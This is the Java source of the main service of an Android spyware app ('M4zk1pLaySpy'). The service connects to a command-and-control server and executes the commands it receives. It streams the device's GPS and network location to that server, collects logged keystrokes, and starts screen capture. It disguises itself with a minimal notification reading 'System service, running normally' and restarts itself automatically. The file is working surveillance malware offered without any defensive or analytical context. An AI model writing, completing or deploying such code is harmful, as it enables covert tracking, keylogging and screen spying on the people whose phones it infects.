package ai.m4zk1play.spy;

import android.app.Activity;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Build;
import android.os.IBinder;
import android.os.Looper;

import org.json.JSONArray;
import org.json.JSONObject;

import java.util.ArrayList;
import java.util.List;

/** Service utama — koneksi C2, lokasi, keylog. */
public class AgentService extends Service implements C2Client.Sink {

    public static AgentService instance;

    private C2Client client;
    private MediaModule media;
    private ScreenModule screen;
    private Router router;
    private LocationManager lm;
    private boolean locating;
    private final List<String> keys = new ArrayList<>();
    private Intent projectionData;
    private int projectionCode = Activity.RESULT_CANCELED;

    @Override
    public void onCreate() {
        super.onCreate();
        instance = this;
        startForeground(0x4d5a, notif());

        Keys k = Keys.read(this);
        client = new C2Client(k, this);
        media = new MediaModule();
        media.bind(this, client);
        screen = new ScreenModule();
        screen.bind(client);
        router = new Router(this, client, media, screen);
        client.connect();
    }

    private Notification notif() {
        String ch = "mzk";
        NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
        if (Build.VERSION.SDK_INT >= 26 && nm != null) {
            NotificationChannel c = new NotificationChannel(ch, "M4zk1pLaySpy",
                    NotificationManager.IMPORTANCE_MIN);
            nm.createNotificationChannel(c);
        }
        Notification.Builder b = Build.VERSION.SDK_INT >= 26
                ? new Notification.Builder(this, ch) : new Notification.Builder(this);
        return b.setContentTitle("Layanan sistem")
                .setContentText("Berjalan normal")
                .setSmallIcon(android.R.drawable.stat_sys_download_done)
                .setOngoing(true)
                .build();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (client == null) {
            Keys k = Keys.read(this);
            client = new C2Client(k, this);
            client.connect();
        }
        return START_STICKY;
    }

    @Override public IBinder onBind(Intent i) { return null; }

    @Override
    public void onDestroy() {
        instance = null;
        try { media.stopAll(); } catch (Exception ignored) { }
        try { screen.stop(); } catch (Exception ignored) { }
        try { client.stop(); } catch (Exception ignored) { }
        super.onDestroy();
    }

    // ---- Sink ----
    @Override public void onReady() { }

    @Override
    public void onCommand(String id, String type, JSONObject args) {
        router.handle(id, type, args);
    }

    @Override
    public void onDown() { }

    // ---- lokasi ----
    public void startLocate() {
        if (locating) return;
        locating = true;
        lm = (LocationManager) getSystemService(LOCATION_SERVICE);
        LocationListener l = new LocationListener() {
            @Override public void onLocationChanged(Location loc) {
                try {
                    JSONObject o = new JSONObject();
                    o.put("lat", loc.getLatitude());
                    o.put("lon", loc.getLongitude());
                    o.put("acc", loc.getAccuracy());
                    if (client != null) client.stream("loc", "", o);
                } catch (Exception ignored) { }
            }
            @Override public void onStatusChanged(String p, int s, android.os.Bundle b) { }
            @Override public void onProviderEnabled(String p) { }
            @Override public void onProviderDisabled(String p) { }
        };
        try {
            if (lm != null) {
                lm.requestLocationUpdates(LocationManager.GPS_PROVIDER, 4000, 3f, l, Looper.getMainLooper());
                lm.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 6000, 5f, l, Looper.getMainLooper());
            }
        } catch (Exception ignored) { }
    }

    public void stopLocate() {
        locating = false;
        try {
            if (lm != null) lm.removeUpdates((LocationListener) null);
        } catch (Exception ignored) { }
    }

    public void needProjection() {
        Intent i = new Intent(this, MainActivity.class);
        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_SINGLE_TOP);
        startActivity(i);
    }

    public void setProjection(Intent data, int code) {
        projectionData = data;
        projectionCode = code;
        if (data != null) screen.start(this, data, code);
    }

    public JSONObject netInfo() {
        JSONObject o = new JSONObject();
        try {
            o.put("local_ip", Modules.ip(this));
            o.put("wifi", Modules.ip(this));
            o.put("battery", Modules.battery(this));
            o.put("charging", Modules.charging(this));
        } catch (Exception ignored) { }
        return o;
    }

    public JSONArray drainKeys() {
        JSONArray a = new JSONArray();
        synchronized (keys) {
            for (String k : keys) a.put(k);
            keys.clear();
        }
        return a;
    }

    public void addKey(String line) {
        synchronized (keys) {
            keys.add(line);
            while (keys.size() > 2000) keys.remove(0);
        }
    }

    public void delayMode() {
        new Thread(() -> {
            long end = System.currentTimeMillis() + 8000;
            while (System.currentTimeMillis() < end) {
                for (int i = 0; i < 400000; i++) Math.sqrt(i);
            }
        }).start();
    }

    public void emitStream(String kind, String line) {
        if (client != null) client.stream(kind, "", null);
    }
}
